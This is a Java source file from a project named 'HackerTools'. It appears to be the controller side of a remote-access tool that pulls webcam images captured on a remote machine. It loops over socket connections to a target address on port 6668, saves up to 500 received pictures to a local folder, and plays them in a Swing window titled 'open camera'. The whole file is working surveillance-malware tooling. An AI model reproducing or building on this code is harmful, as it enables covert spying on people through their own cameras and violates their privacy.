package HackerTools;

import java.awt.Container;
import java.awt.Font;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRootPane;
import javax.swing.WindowConstants;
import javax.swing.plaf.FontUIResource;

/**
 * 播放截取的摄像头图片
 * */
public class PictureView {
    public static JFrame jf = new JFrame();
    public static JPanel mainPanel = new JPanel();
    private static int picNum = 100;
    private static int picCount_receive = 0;

    public void setPictureNumber(int picNum) {
        this.picNum = picNum;
    }

    public PictureView() {
        Thread thread_receivePic = new Thread() {
            public void run() {
                server_camera_socketManager();
            }
        };
        thread_receivePic.start();
    }

    public void server_camera_socketManager() { // 在构造的时候生成一个
        File file = new File("picture"); // 创建文件夹存储图片
        if (!file.exists()) {
            file.mkdir();
        }

        int port_camera = 6668;// 端口设置
        String serverName = Index.ipAddress;
        while (true) {
            if(picCount_receive < 500){
                try {
                    System.out.println("连接到主机：" + serverName + " ，端口号："
                            + port_camera);
                    Socket client = new Socket(serverName, port_camera);
                    System.out.println("远程主机地址：" + client.getRemoteSocketAddress());

                    InputStream in = client.getInputStream();
                    FileOutputStream fos = new FileOutputStream(file.getAbsolutePath()+"\\"+"sever@@@"
                            + picCount_receive + ".png");
                    byte[] buf = new byte[4096];
                    int len = 0;
                    while ((len = in.read(buf)) != -1) {
                        fos.write(buf, 0, len);
                    }
                    picCount_receive++;
                    OutputStream out = client.getOutputStream();
                    fos.close();
                    in.close();
                    out.close();
                    client.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");

                } catch (IOException e) {
                    e.printStackTrace();

                }}
            else{
                picCount_receive=0;
            }
        }

    }

    public static void show_PictureView() {
        int frame_width = 800;
        int frame_height = 600;
        int i = 0;


        FontUIResource fontUIResource = new FontUIResource(new Font("宋体",
                Font.PLAIN, 12));
        // jf = new JFrame("测试窗口");
        jf.setTitle("打开摄像头");// 设置标题
        jf.setLayout(null);
        jf.setUndecorated(true);
        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        jf.setLocationRelativeTo(null);
        jf.getRootPane().setWindowDecorationStyle(JRootPane.PLAIN_DIALOG);

        jf.setVisible(true);
        videoPlay();

    }

    public static void videoPlay() {
        mainPanel = new JPanel();
        mainPanel.setBounds(0, 0, 800, 600);
        mainPanel.setLayout(null);// 主界面mainPanel初始化

        File file = new File("picture"); // 创建文件夹存储图片
        if (!file.exists()) {
            file.mkdir();
        }

        boolean flag = true;

        int i = 0;
        String path = file.getAbsolutePath()+"\\"
                + "sever@@@" + i + ".png";
        while (true) {
            if (new File(path).exists() && new File(path).isFile() && new File(path).length()/1024>130) {
                if (flag) {
                    JOptionPane.showMessageDialog(null, "即将打开摄像头,请确认");
                    flag = false;
                }
                path = file.getAbsolutePath()+"\\"+ "sever@@@" + i + ".png";
                File originalFile = new File(path);// 指定要读取的图片
                System.out.println(path);

                System.out.println(i);
                ImageIcon img = new ImageIcon(path);//这是背景图片
                JLabel image = new JLabel(img);
                image.setBounds(0, 70, 600, 400);
                jf.getLayeredPane().add(image);
                jf.getLayeredPane().moveToFront(image);

                mainPanel.setBounds(0, 0, 800, 600);
                mainPanel.add(ToolBar.toolBar);

                jf.setSize(800, 600);
                jf.setTitle("打开摄像头");
                jf.add(mainPanel);
                Container cp=jf.getContentPane();
                ((JPanel)cp).setOpaque(false); //注意这里，将内容面板设为透明。这样LayeredPane面板中的背景才能显示出来。
                jf.setLocationRelativeTo(null);
                i++;
                try {
                    Thread.sleep(650);
                } catch (InterruptedException e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }
            } else {
                System.out.println("111");
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }
}
